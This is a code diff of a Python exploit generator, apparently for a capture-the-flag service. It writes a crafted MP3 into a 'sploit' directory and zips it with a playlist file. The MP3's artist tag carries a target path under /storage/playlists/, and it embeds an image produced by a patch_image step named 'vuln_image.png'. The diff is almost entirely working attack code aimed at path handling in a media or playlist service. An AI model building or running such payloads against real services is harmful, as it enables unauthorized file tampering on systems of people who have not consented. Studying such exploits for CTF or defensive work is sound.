@@ -6,7 +6,7 @@ from PIL import Image
 from PIL.PngImagePlugin import PngInfo
 
 
-def create_track_fix(track_name, image_path, tags):
+def create_track_fix(track_name, image_path, artist):
     shutil.copy("proto_track.mp3", track_name)
     mp3file = eyed3.load(track_name)
 
@@ -16,8 +16,9 @@ def create_track_fix(track_name, image_path, tags):
     with open(image_path, 'rb') as img:
         img_bytes = img.read()
 
-    mp3file.tag.album = ""
-    mp3file.tag.artist = tags["artist"]
+    mp3file.tag.album = "."
+    mp3file.tag.artist = artist
+    mp3file.tag.title = "."
     mp3file.tag.images.set(3, img_bytes, 'image/png')
     mp3file.tag.save()
 
@@ -36,17 +37,13 @@ def patch_image():
 
 
 def create_playlist_file(path_for_playlist):
-    tag = {
-            "album": f"",
-            "artist": f"{path_for_playlist}",
-        }
 
     playlist_dir = "sploit"
     patch_image()
 
     os.mkdir(str(playlist_dir))
 
-    create_track_fix(f"{playlist_dir}/track1.mp3", "vuln_image.png", tag)
+    create_track_fix(f"{playlist_dir}/track1.mp3", "vuln_image.png", path_for_playlist)
     shutil.copy("proto_playlist.m3u", f"{playlist_dir}/playlist.m3u")
     shutil.make_archive(f"{playlist_dir}", "zip", str(playlist_dir))
     shutil.rmtree(str(playlist_dir))
@@ -55,4 +52,3 @@ def create_playlist_file(path_for_playlist):
 create_playlist_file(
     "/storage/playlists/00000000-4444-5555-6666-000000000000.m3u",
 )
-
